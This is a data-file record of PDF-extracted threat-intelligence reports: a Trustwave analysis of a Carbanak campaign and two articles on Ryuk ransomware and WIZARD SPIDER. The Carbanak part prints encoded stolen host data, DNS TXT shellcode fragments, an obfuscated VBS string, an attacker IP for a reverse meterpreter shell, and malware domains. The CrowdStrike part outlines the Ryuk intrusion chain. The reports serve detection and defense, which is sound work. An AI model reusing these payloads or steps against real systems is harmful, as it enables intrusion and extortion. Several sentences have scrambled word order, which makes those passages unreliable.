System Name: JLA-FORENSICS System Manufacturer: Dell Inc. System Model: Precision M4800 Time Zone: -300 Total Physical Memory: 34295918592 Processor System Type: 9 Processor: Intel64 Family 6 Model 60 Stepping 3 BIOS Version: DELL - 1072009 Perform : 64-bit %UsrNmCmpNmDomNm% Networking information Computer name : JLA-FORENSICS Domain : jla-forensics User name : jantonakos This information is processed using the 5-step sequence just described, giving: JLXx93MkAM6GREAA7j6MeERrLM7m9F aPpiXTMIXXKfBU1lPSEL1L2xmcLi7X 2dBXpVTBpIRAKdIXUjj47bBL2bmr https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 14 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 EiEXLjEQebBGAcK3KM1U9jTjJbTf9M RWKMTU7icLejjYLFgnKMTG7bC3BqTF EV6VLlTtexjVUVMrJEjwkE2I1Im5 Ak6BexO4AjjnMjPKGfRTMIXHGEY0Jj i37QYRAFjckEFnGcpmkL1EMIYcYj1J JjiQEfjf9MYXkdl0kxjVkulh2IXd LxXAYcF3UVlfAQlXLMTG7bC3BFXv9b AnKxcG1xpQkL1GAdmXLl1U2bCQGfMr JERFkdmwLjBMBEME2LAEAjjnkLC3 kxThAcEdGEA62FcFJIXvJIK3LM1H7c lVGuBJEIRAKETHexjVkxThpIRULl7m 1xBSJQYRAFcZkMAR1IXELk6FEV6M KfBGJbRvpl1TLFgnYj1b7Ilj2LmhMQ lXYMAsYIc4YQ6UeiiIkiAAkiBWAfRY MdmQLM1t7cPkpl1TLFgnYj1b7Ilj 2LmhMQlXYMAsYIc4EkRBMb23kMAYki BWUMARAkMgKl1MBilFEkMrAFFQkVPY kiBHkfMf2cRHKlB0kclV2LmrJERy MFMj1jRWUMBGMkMEEcMUMFAA7jAlLF wnLl7nYcAVAuMiMcPgLkBG2LBOMulr JERjLl1w7Ilj9qMYekAUpdmUBL2Q ExmhEIRUKfRG9bRF9d1MGFPHLkRHex jVUVMRAk8nkIA61IAA7jMTMQjHGEYn 1xROMkYRpQ64kEA6kiBHEuYiAIYQ GEY09dMKku6Y2iYQGEEm9bRVUVllMb aukVPAeEaEMkMBMb7mkcARkiBHpulh 2iXHKQBU1xBPplAlLFwnLl7nYcYC 9q1JMbaukcFnGcMCGuYY2lY4KQCXeE aPpiPh9lRHKiAY2FljLxThMdmQYMB6 2ilj2VYJAcYQGEAY1Ilbkf6JLFRZ KM7c9ilFkEXvJIPtMvjBYcYOMulf2x mdKxPsYcRjMicEpIjuGE2nYIcEpkBB JijZkcFnGcMqMulJ9klXKlB6BilF Lk62MIPnYFFnGIPLMuPfJQMEkCm1cA O2EMh2fjrKlBMkiBWBLmiGbAdKdcI7 bROKd1TMQMOKfBt1jlKEu6h2fAUp https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 15 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 d7nGcF3UVAfGjKnLlTRYdROAuAJEIF dGEMnkMjk2E1E2EPbMbmUGlFmkEXvJ cRdKl1b7bRPpkYRAZ6QLM2m9LCQG xmh9iXnLkBBkiBHMuPJLFluKxcb1jP kpkYRAZ6gKxXG1xROAuRh2IcUpd7ar p%3D%3D And here we see similar information from a different system on its way to the attacker: Knowing the format of the messages sent to the attacker may assist in developing alerts for your organizations SIEM, firewall, or other security monitoring tools. Lateral Movement Without Passwords Unlike previous campaigns, where Mimikatz or some other credential stealer was used, lateral movement between systems is accomplished without user accounts and passwords. Instead, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 16 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 the malware bypasses authentication on the remote system and uses SMB commands (including TreeConnect and Open/Write AndX) to locate a vulnerable host by checking the ability to write data to the C:\Windows\Temp folder on a potential victim system. If the write operation is performed, the attacking system writes a short batch file to the victim and runs it remotely via another SMB command (DCERPC). The batch file creates a log file whose contents are either ""x86"" or ""amd64"" depending on the bit-size of the operating system on the victim. The batch file looks like this: to folder and The attacking system reads the log file and uses its contents to then transfer a 32-bit or the victim's 64-bit executable file it. The run C:\Windows\Temp executable acts as a stager and enables the transfer of the meterpreter DLL to the victim system. The meterpreter DLL is made operational via reflective DLL injection, which copies the meterpreter DLL into the memory space of a chosen victim process (such as explorer.exe) and runs it as a thread. The entire sequence of operations looks like this: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 17 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 The {~random} file names are not really random, but instead a base64 combination of the victim's system volume serial number and MAC address, which are obtained by queries to the system's WMI Service. The IP address 5.149.251.167 is used to enable a reverse_TCP meterpreter shell back to the attacker' system, allowing for complete control over the victim computer. at running a 5.149.251.167 meterpreter listener that transfers an XOR- encrypted meterpreter DLL to the victim and provides the quiet and authentication-free lateral movement between systems the attacker wants. is most attacker system likely The This WHOIS lookup of 5.149.251.167 indicates that this IP address should raise red flags. A total of 606 SMB messages back and forth between the attacking and victim systems are infection steps needed to process the 9 previously described, and takes 105 seconds to complete, as the stager EXE is 59 KB. The https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 18 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 stager is one of many that have been created to enable victim-CnC communication using metasploit. following Wireshark screenshot shows a small portion of the SMB messages that transfer the stager to the victim: The Malware Transfer Via DNS TXT Records A PowerShell script created by the infected email attachment contains a base64-encoded block of text that is decoded, written into memory as a thread, and executed. This uses the same technique as the metasploit 'DNS TXT Record Payload Download and Execution' module, as described below (with slightly modified code): This code performs DNS queries to the attacker's malware domain, as illustrated here: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 19 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 A 255-character TXT record is received in response to each query. For example, a query to: aaa.stage.3553299.s1.rescsovwe.com returns the TXT record: WYIIIIIIIIIIIIIIII7QZjAXP0A0Ak AAQ2AB2BB0BBABXP8ABuJIIljHs0wp wpuPjK0NaMlK1UePLycWrOU72ONcyU va 4yhHd5iaLCKuWsaE6QzVP1ioTqKkCV nkClduUPNY51U1gpUP5i8KbTVCTq9P eakbLHhZk0XjBaK9zpiQ9p7t4qIBk8 Ij K0ZJW17q8PnhaTEmc0os9WEQosIVfb hkhM68ioYp8hnMyoYoIoAAgogoENFK OIAAAAAAAAF The next query is to subdomain baa, which returns: LFCEFFFIJOFIBMDFCHDAAAAPPNDIJM DFHGIAEAAAAAAFAPPNAGIPALFKCFGG IAFAAAAAAFAPPNDAAAAAAAAAAAAAAA AA AAAAAAAAAAAAAPAAAAAAAAOBPLKAOA ALEAJMNCBLIABEMMNCBFEGIGJHDCAH AHCGPGHHCGBGNCAGDGBGOGOGPHECAG CG https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 20 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 FCAHCHFGOCAGJGOCAEEEPFDCAGNGPG EGFCOANANAKCEAAAAAAAAAAAAAADID ICCBAHMFJEM Note that frequency analysis of the symbol distribution in the records may be helpful in generating a rule for detection, as well as also noting if additional systems are performing the same queries. From a detection perspective, it is important to note that the TXT records are specifically requested in the DNS query, as shown here: This is not typical DNS behavior. As you refer back to the first TXT record you'll see the majority of the symbols are colored differently. You may also notice there are alphanumeric symbols in this portion of the in the TXT record that do not appear remainder of the record, or in fact, in any of the remaining 1,542 TXT records (as the DNS queries cycle through caa, daa, and so on up to zaa, then rolls over to aba, bba, caa, etc. until all the TXT records have been obtained). The alphanumeric portion of the first TXT record is alphanumeric shellcode. The advantage of using alphanumeric shellcode is that it flies under the radar of AV and IDS/IPS, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 21 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 even though the ASCII codes associated with the alphanumeric characters represent actual 80×86 opcodes. Here are a few examples: Here is a portion of the alphanumeric shellcode decoding loop (original alphanumeric shellcode and decoded shellcode): The shellcode decodes itself to create more useful and efficient instructions needed to that decode remaining TXT contain is undergoing detailed analysis and additional information will be forthcoming. the the payload. The payload records Note: a previous Carbanak campaign used this base domain: aaa.stage.14919005.www1.proslr3.com Both of these DNS malware domains are https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 22 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 registered in Russia. As with many malware delivery domains, they operate for a short period of time and then are shut down as the attackers move to a different domain. Now, consider this: the number of DNS queries to the three-letter subdomains for the malware analyzed in this new campaign is 1,543. That is a very significant number of 255-character TXT records and over 385 KB of encoded characters. In one test the time to perform the 1,543 queries is 214 seconds, or 7 queries per second. than This is an example of ""program behavior"" ""human behavior."" Security rather analysts would agree that this clearly indicates a human was not sitting at a computer rapidly clicking links for over three minutes straight. Recognizing this type of behavior is a valuable addition to an organization's malware alerting controls. A continuous stream of DNS queries from the same system to the same TLD exceeding 420 queries per minute or some similar threshold would be a suitable alerting mechanism (not for a busy server perhaps but certainly for a user workstation). Layers Upon Layers The Carbanak malware writers have used several methods to hide the functionality of their malware. Consider all of these steps required to fully deliver just one of the malware files in this campaign: !"" PowerShell script file created from base64 encoded string hidden in https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 23 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 malicious Word document. $"" Decoding the final PowerShell script requires three levels of decoding. %"" The final PowerShell file contains a base64 encoded string representing 80×86 machine code that implements a DNS TXT record exploit, and is loaded into RAM and executed. &"" Alphanumeric shellcode and encoded payload are obtained via DNS TXT records. '"" Alphanumeric shellcode contains an initial decoding stub that XOR decrypts a portion of the shellcode into the payload decoder. ("" The payload decoder uses the remaining TXT record data to create an in-memory DLL file, thus ensuring that this attack does not leave malware traces on the system itself, only in memory. The operation of the payload decoder is very simple: Each pair of ASCII characters become a single byte of code in the final payload. As shown in the following figure, each ASCII code in a pair has 'A' (0×41) subtracted from them. The resulting difference is always between 0 and F and becomes the high-order or low- order nibble of the final payload byte. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 24 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 In addition to the base64 encoding, other files are also encoded and obfuscated. For example, the script updater is initially created by decoding a base64 string. But looking into the file shows these two encoded and obfuscated sections: Take a moment to examine the symbols in the string that represents the encoded VBS statements. Then look at the symbols in the decoding key, and perhaps you'll see where I am headed. Did you notice anything strange? If you missed https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 25 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 it, take a look here: Only the first 16 symbols in the decoding key are used to decode the VBS statements string. The second group of 16 symbols do not appear anywhere in the VBS statements string. In fact, the only place all those symbols appear is in a second encoded string that is at the end of the encoded and obfuscated VBS file, and this referenced or processed. string Decoding the string results in binary mumbo- jumbo and the purpose of this unused string is not known at this time. is not If you are a ""code talker"" and want to give the second string a go, here it is: ""h8u74y828mcd89t7o3n5rr2i8uyya i1o5wih80suwavtfzu2aszcqsnltmi jv22sa0ti/""_ &""9fhpd9ccjslgo3i2zgwrio8ot7w0 ouarnauyh5ornfflamdyrmm7q1r2sy pvm220rgv/""_ &""c9o90ivp2o3qeo45jyinmzc3rp3f zp1p9nrpsncd4og2tl0yt1s3f2o7s5 n3y9i4c/""_ &""514wg5owsscyjp3mr1an2h33yg5z fgp7rssejd3nmy787m8gh011inoe4h o7tgl4ypzm9/""_ &""u9w9yrnu1z158l59ozrryln0wdes lmj7mc1ugjwc32t1c5d0j1u4tr1v2a 24zuvivg/""_ &""5solssu4qr8woavp3wyz4hrwjfoi https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 26 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 su3zrr5lph4vftul2zi5mtmnh0ssl9 maa4pmd7oyya/""_ &""q0rhm1mnrhzde2rmulasifdnho7q zf0l4vp0pa392j439ljcfwg5wd2fai 9f40ohgd/""_ &""i33qhaqmoc1n8svjswzuw4had8cw uocg3eqo2vrwv832o17jn7wyzp0oap lntjlwpgayu/""_ &""icle7mrmr0cgyz4cyyr7poodefea m2rflfjzhjznstuyan0v1ojf7og1nn up5m2dltst3s5r/""_ &""w111uv0wqz0h770devyygv895wjg z4vlc25l4lp4v0m47jcru28n808moi l9g2iyajc/""_ &""gy9j9vj0jjdy1yvhmynruqh1j29r fugw3hwdyrqinai8tvavzmqidhwo3c 4zluypo3u/""_ &""l8vg470m1hyp7dhjyqamqrc9owg9 sjup99w9rnvgggpfhpvhfaileyuoq4 wr0mozdc/""_ &""jjdg830wiafscumvcw3flyfj3nsl iwahtu8a3y4pugpd9aq95r4lc7lg1a zl9fgf3umu0s28i2u4/""_ &""g32pdv8lzhs4ny3rt5i3ir8vc22z o3iifyil77qncc3pthigrac01ge352 29jy88dmh8je/""_ &""f2ohgefdy7g9pthifu2ia0vgh31d zpq9mi598ras14cf745y8jp19rpoof y2wd2dn12vltwwv/""_ &""syf27jq7ttlpleafv340n8imonfh 1himrprjg9gjozluscrghgzouuh9td 91cclrtr0v3/""_ &"""" The deobfuscated decoder looks like this: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 27 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 The obsPayload1 variable is set equal to the long encoded string representing the actual VBS statements. Leaving files encoded like this while they reside on disk is an attempt to prevent detection by AV scans looking for suspicious keywords. Note that the last statement in the DeObs1() subroutine should be the VBS WScript.Run DecodedPayload1 but was changed to WScript.Echo to simply view, rather than execute, the code. Watch The Compromise Unfold If you have access to CarbonBlack, the chain of events and spawned processes can be traced from the moment the malicious Word document is opened. Here is a timeline of an actual compromise: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 28 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 and/or prevent actions we do not want taking place. Organizational Preparedness There are several steps an organization can take to prevent or limit the severity of a Carbanak attack. All of the following steps apply and can be achieved via internal security engineering or by engaging an MSSP: Regular security awareness training for all employees, paying particular attention to spear phishing. Spear phishing exercises where employees are sent a 'phishing' email that points to a site controlled by IT (Trustwave SpiderLabs also offers this service). An email server or appliance that can assist with malware detection, such as scanning incoming email attachments for base64 strings. Macros disabled by default on all Office applications (although a user can still re- enable them). A SIEM or other log-and-event aggregation system that allows aggregated network traffic to be examined by an expert security team before, during, and after an attack. Ensuring that IDS rules are able to detect metasploit modules. Threat intelligence driven software restriction policies, such as preventing program execution from C:\Windows\Temp. Whitelist PowerShell scripts and VBS https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 30 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 scripts used by the organization and blacklist all others. Continuous DNS monitoring with threshold alerts for systems issuing excessive DNS queries in a given period of time. Restrict DNS traffic so that internal systems are only able to query your DNS servers. Conclusion The Carbanak campaign is not standing still and neither is Trustwave SpiderLabs. Look for another update shortly. Latest SpiderLabs Blogs Trustwave Rapid Response: CrowdStrike Falcon Outage Update Trustwave is proactively Using AWS Secrets Manager and Lambda Function to Store, Rotate Facebook Malvertising Epidemic – Unraveling a Persistent Threat: SYS01 The Trustwave SpiderLabs Threat https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 31 di 33"
wizardspider,cti-hal,9fd7d34aef51,G0102,"Ryuk wakes from hibernation; FBI, DHS warn of healthcare attacks | Cybersecurity Dive 25/07/24, 18:06 Ryuk wakes from hibernation; FBI, DHS warn of healthcare attacks Researchers found that threat group UNC1878 is responsible for one-ﬁ""h of Ryuk intrusions. “Herein lies our monster,” said Mandiant’s Aaron Stephens. Published Oct. 29, 2020 Samantha Schwartz Reporter Stock Photo via Getty Images Ryuk ransomware fell off the radar when the coronavirus began its global spread. Its silence hinted at its expiration or a rebrand in the form of the Conti ransomware. Really, Ryuk was just in hibernation between April and August. On a call with the FBI, Department of Homeland Security and Department of Health and Human Services, the agencies warned the healthcare industry of a potential ransomware attack. ”CISA, FBI, and HHS have credible information of an increased and imminent cybercrime threat to U.S. hospitals and healthcare providers,” the alert said. The expected onslaught of Ryuk ransomware could reach up to 400 hospitals, Alex Holden, CEO of Hold Security, told cybersecurity journalist Brian Krebs. “Maybe Ryuk’s time had come and gone. Obviously, we were really, really wrong,” said Aaron Stephens, senior threat analyst on https://www.cybersecuritydive.com/news/Ryuk-FBI-DHS-ransomware-healthcare/587961/ Pagina 1 di 6 Ryuk wakes from hibernation; FBI, DHS warn of healthcare attacks | Cybersecurity Dive 25/07/24, 18:06 Mandiant’s FLARE Advanced Practices Team, while speaking during a SANS Institute webcast Wednesday. Mandiant found that threat group UNC1878 is responsible for one- fifth of Ryuk intrusions. “Herein lies our monster,” said Stephens during the webcast. The cybersecurity firm released research on UNC1878’s indicators Wednesday following news of attacks on hospitals. Mandiant researchers coined “UNC,” shorthand for uncategorized, as part of their research processes, they needed “UNCs” to help organize unique malicious activity. “At a fundamental level UNCs serve as labels for which you can bucket indicators and techniques into. This labeled bucket would then act as technical anchor for what we are seeing is related activity,” said Van Ta, senior threat analyst on Mandiant’s FLARE Advanced Practices Team, speaking on the webcast. “Instead of labeling an evidence bag, ‘the Overlook Hotel’, we’re labeling it UNC1878.” “We began to see Ryuk make its harrowing return. It wasn’t dead. It was undead.” Aaron Stephens senior threat analyst on Mandiant’s FLARE Advanced Practices Team When enough UNCs are identified, researchers can cross section overlaps or see where UNCs graduate into different classifications, or threat groups. UNC1878 was created in January and within two months Mandiant picked up UNC1878’s “formative years,” where it developed its strategies, said Ta. https://www.cybersecuritydive.com/news/Ryuk-FBI-DHS-ransomware-healthcare/587961/ Pagina 2 di 6 Ryuk wakes from hibernation; FBI, DHS warn of healthcare attacks | Cybersecurity Dive 25/07/24, 18:06 In September, “we began to see Ryuk make its harrowing return. It wasn’t dead. It was undead,” Stephens said. The actors behind Ryuk are credited with collecting more than $61 million between February 2018 and October 2019, according to the FBI, making it one of the most profitable strains. Retirement didn’t seem likely. Ryuk-related incidents increased from 5,123 in Q3 2019 to 67.3 million in Q3 2020, according to research from SonicWall Capture Labs. The company relied on more than 1 million global sensors to collect cyberattack data through September. Ryuk reportedly targeted Universal Health Services (UHS) in September and French IT services firm Sopra Steria earlier this month. Last week, furniture manufacturer Steelcase disclosed a cyberattack on its IT systems in an SEC filing. Sources told Bleeping Computer Ryuk was behind the attack. Steelcase “implemented a series of containment measures to address this situation,” including system and operational shutdowns, to mitigate the attack. “Although cyberattacks can be unpredictable, the company does not currently expect this incident will have a material impact on its business operations or its financial results,” Steelcase said. UNC1878’s Ryuk gameplan UNC1878 traditionally relied on Trickbot, which provides initial access and visibility, and used Cobalt Strike with everyone of its intrusions. UNC1878 obtains credentials using Mimikatz, LaZagne and Kerbrute. “With legitimate credentials UNC1878 extended their access by connecting to network shares and directly to systems over RDP https://www.cybersecuritydive.com/news/Ryuk-FBI-DHS-ransomware-healthcare/587961/ Pagina 3 di 6 Ryuk wakes from hibernation; FBI, DHS warn of healthcare attacks | Cybersecurity Dive 25/07/24, 18:06 and SSH,” said Ta. This month, Microsoft was granted permission to disable Trickbot’s critical infrastructure. A week into the disruption, Microsoft claimed to have eliminated “94% of Trickbot’s critical operational infrastructure including both the command-and- control servers in use at the time our action began and new infrastructure Trickbot has attempted to bring online.” However, Microsoft acknowledged the maturity of Trickbot and impending threats, saying “this is challenging work, and there is not always a straight line to success.” Ryuk typically uses Emotet for a phishing or RDP attack, but Sophos studied a September Ryuk attack which showcased a different tactic outside of Emotet and Trickbot. “It marked the return of Ryuk with some minor modifications” and next- generation attack tools, according to Sophos’ report. “People think ransomware, and the malware cocktails, they’re just re-flavoring. But if you look at Ryuk, they’re using it as a malware cocktail, not just changing the ingredients,” said Bill Conner, CEO of SonicWall. In the September attack Sophos investigated, the malicious document in the phishing email executed Buer Loader, a modular malware as a service downloader, to get access. Time to Ryuk The September Ryuk incident Sophos investigated uncovered a quick infection-to-deployment time after someone opened the phishing email. It took 3 1/2 hours. While each installment attempt failed, Ryuk’s operators persevered, “including renewed phishing attempts to re-establish a foothold,” according to https://www.cybersecuritydive.com/news/Ryuk-FBI-DHS-ransomware-healthcare/587961/ Pagina 4 di 6 Ryuk wakes from hibernation; FBI, DHS warn of healthcare attacks | Cybersecurity Dive 25/07/24, 18:06 Sophos. Operators behind Ryuk are “really recreating these malware cocktails and bundles, if you will, to make them much more lethal,” which increases their speed and scalability, said Conner. UNC1878’s “time to Ryuk,” or intrusion to execution time, was on average about five days and 17 hours. It is demonstrably faster than other ransomware’s “dwell time,” roughly 72 days and 12 hours, according to data from 2019. UNC1878 could “ransom 13 environments in the same amount of time,” said Stephens. When UNC1878 is ready to deploy Ryuk, it will drop the zip file into the PerfLogs directory. “They’ll then unzip into a directory they create named “share$,” said Ta. Coupled with text files are the ransomware binary and patch files for malware propagation. There are three ”.bat” scripts used for iterating computer names to execute Ryuk. At the beginning of the year, UNC1878 used Trickbot, Cobalt Strike and Ryuk. But Ryuk’s return doesn’t necessarily mean UNC1878 returned too. “This new wave of Ryuk intrusions have essentially replaced Trickbot with Kegtap, a similar but distinctly different malware family,” said Stephens. Kegtap is among campaigns sent to targets with ever-changing ”delivery tactics, techniques and procedures,” according to Mandiant. Campaigns like Kegtap have shifted from delivery via Sendgrid to having URLs host malware payload “associated with one or more of these legitimate services.” Even the use of Cobalt Strike isn’t the same as it once was, particularly seen in TLS certificates. Mandiant noticed differentiation in certificates, nuances in domain patterns, and general overlaps in activity. Researchers identified a https://www.cybersecuritydive.com/news/Ryuk-FBI-DHS-ransomware-healthcare/587961/ Pagina 5 di 6 Ryuk wakes from hibernation; FBI, DHS warn of healthcare attacks | Cybersecurity Dive 25/07/24, 18:06 newly-minted UNC2352 as the successor to UNC1878. “If these two groups should really be the same, the data will tell us and in this case, it did,” said Stephens. https://www.cybersecuritydive.com/news/Ryuk-FBI-DHS-ransomware-healthcare/587961/ Pagina 6 di 6"
wizardspider,cti-hal,78aacc23cb5c,G0102,"What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 × "" Search Preliminary Post Incident Review (PIR) Read now ""     ✉ | BLOG Featured ⌄ Recent ⌄ Videos ⌄ Categories ⌄ Start Free Trial Big Game Hunting with Ryuk: Another Lucrative Targeted Ransomware January 10, 2019 Alexander Hanel Counter Adversary Operations WIZARD SPIDER is a sophisticated eCrime group that has been operating the Ryuk ransomware since August 2018, targeting large organizations for a high- ransom return. This methodology, known as “big game hunting,” signals a shift in operations for WIZARD SPIDER. This actor is a Russia-based criminal group known for the operation of the TrickBot banking malware that had focused primarily on wire fraud in the past. The actor name GRIM SPIDER was introduced into CrowdStrike’s nomenclature in September 2018 for the group that operates the Ryuk ransomware as a distinct sub- group of the WIZARD SPIDER criminal enterprise. However, in June 2019, further evidence emerged that allowed CrowdStrike to assess with high confidence that Ryuk is in fact operated as part of the core WIZARD SPIDER actor group. CrowdStrike Intelligence will now solely use the actor name WIZARD SPIDER in association with TrickBot and Ryuk. The GRIM SPIDER actor name has been deprecated. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 1 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 Similar to Samas and BitPaymer, Ryuk is specifically used to target enterprise environments. Code comparison between versions of Ryuk and Hermes ransomware indicates that Ryuk was derived from the Hermes source code and has been under steady development since its release. Hermes is commodity ransomware that has been observed for sale on forums and used by multiple threat actors. However, Ryuk is only used by WIZARD SPIDER and, unlike Hermes, Ryuk has only been used to target enterprise environments. Since Ryuk’s appearance in August, the threat actors operating it have netted over 705.80 BTC across 52 transactions for a total current value of $3,701,893.98 USD. Want the latest insights on the cyber threat landscape? Download the 2021 Global Threat Report 1. Ryuk Ransom Notes The Ryuk ransom note is written to a file named RyukReadMe.txt. A number of different ransom note templates have been observed. The body of the template is static with the exception of the email address and the Bitcoin (BTC) wallet address, which may change. The email addresses usually contain one address at protonmail.com and another address at tutanota.com. The email names typically are esoteric actors and directors, but Instagram models have also been observed. Interestingly, the ransom note in Figure 3 is remarkably similar to the BitPaymer ransom notes. As of this writing, it remains unclear if WIZARD SPIDER is copying the TTPs (tactics, techniques and procedures) and ransom notes of BitPaymer, or whether the groups may share information with each other. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 2 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 Figure 3. Ryuk Ransom Note Bearing Strong Resemblance to BitPaymer The ransom email used by Ryuk appears to be unique for each compiled executable. Our Using threat intelligence, our team has observed several different email addresses, but the same BTC addresses across multiple Ryuk executables. On Nov. 29, 2018, WIZARD SPIDER changed how they communicated with their victims. As seen in the previous ransom note version, WIZARD SPIDER included their BTC address and email addresses. However, recent variants of Ryuk no longer contain the BTC address — only the email addresses. The ransom note states that the victim will receive the BTC address as a reply from WIZARD SPIDER. The new ransom note can be seen below. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 3 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 Figure 4. Ryuk Ransom With BTC Address Removed Early Ryuk binaries with the removal of the BTC address contained a PDB path of C:\Users\Admin\Documents\Visual Studio 2015\Projects\ConsoleApplication54new crypted try to clean\x64\Release\ConsoleApplication54.pdb. This PDB path started appearing on Nov. 29, 2018. The removal of the BTC addresses occurred a day after the U.S. Department of Justice unsealed indictments for two individuals involved in facilitating cashouts from Samas Bitcoin addresses. Ransom Payments Based on observed transactions to known Ryuk BTC addresses, the ransom demand varies significantly. This suggests that WIZARD SPIDER (like INDRIK SPIDER with BitPaymer) calculates the ransom amount based on the size and value of the victim organization. To date, the lowest observed ransom was for 1.7 BTC and the highest was for 99 BTC. With 52 known transactions spread across 37 BTC addresses (as of this writing), WIZARD SPIDER has made 705.80 BTC, which has a current value of $3.7 million (USD). With the recent decline in BTC to USD value, it is likely GRIM SPIDER has netted more. The tables in the Appendix include a set of known Ryuk BTC addresses extracted from Ryuk binaries, which are believed to be only a subset of the Ryuk BTC addresses. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 4 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 2. How Ryuk Ransomware is Distributed CrowdStrike® has conducted multiple incident response (IR) engagements responding to Ryuk infections in which TrickBot was also identified on hosts in the victim environment. CrowdStrike Falcon® Intelligence™® believes that the initial compromise is performed through TrickBot, which is typically distributed either via spam email or, through the use of the Emotet (developed and operated by MUMMY SPIDER) geo-based download function. Falcon Intelligence has been monitoring the geo-based download activity from Emotet and, during 2018, MUMMY SPIDER has been an avid supporter of WIZARD SPIDER, predominantly distributing TrickBot to Emotet victims in the U.K., the U.S., and Canada. Some of TrickBot’s modules (such as pwgrab) could aid in recovering the credentials needed to compromise environments — the SOCKS module in particular has been observed tunneling PowerShell Empire traffic to perform reconnaissance and lateral movement. Through CrowdStrike IR engagements, WIZARD SPIDER has been observed performing the following events on the victim’s network, with the end goal of pushing out the Ryuk binary: An obfuscated PowerShell script is executed and connects to a remote IP address. A reverse shell is downloaded and executed on the compromised host. PowerShell anti-logging scripts are executed on the host. Reconnaissance of the network is conducted using standard Windows command line tools along with external uploaded tools. Lateral movement throughout the network is enabled using Remote Desktop Protocol (RDP). Service User Accounts are created. PowerShell Empire is downloaded and installed as a service. Lateral movement is continued until privileges are recovered to obtain access to a domain controller. PSEXEC is used to push out the Ryuk binary to individual hosts. Batch scripts are executed to terminate processes/services and remove backups, followed by the Ryuk binary. 3. From Hermes to Ryuk: Similarities & Differences Hermes ransomware, the predecessor to Ryuk, was first distributed in February 2017. Only one month after its release, a decryptor was written for Hermes, followed by the release of version 2.0 in April 2017, which fixed vulnerabilities in its https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 5 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 cryptographic implementation. Since this release, the only way for a victim to recover files is with the private encryption key, which is obtained by paying the ransom. In late August 2017, Hermes version 2.1 was released. Hermes was originally sold on forums for $300 USD. When purchased, the buyer received a build that supported two email addresses, a decryptor and a unique RSA key pair. If the purchaser desired more email addresses, they were required to purchase another build for an additional $50. The seller of Hermes 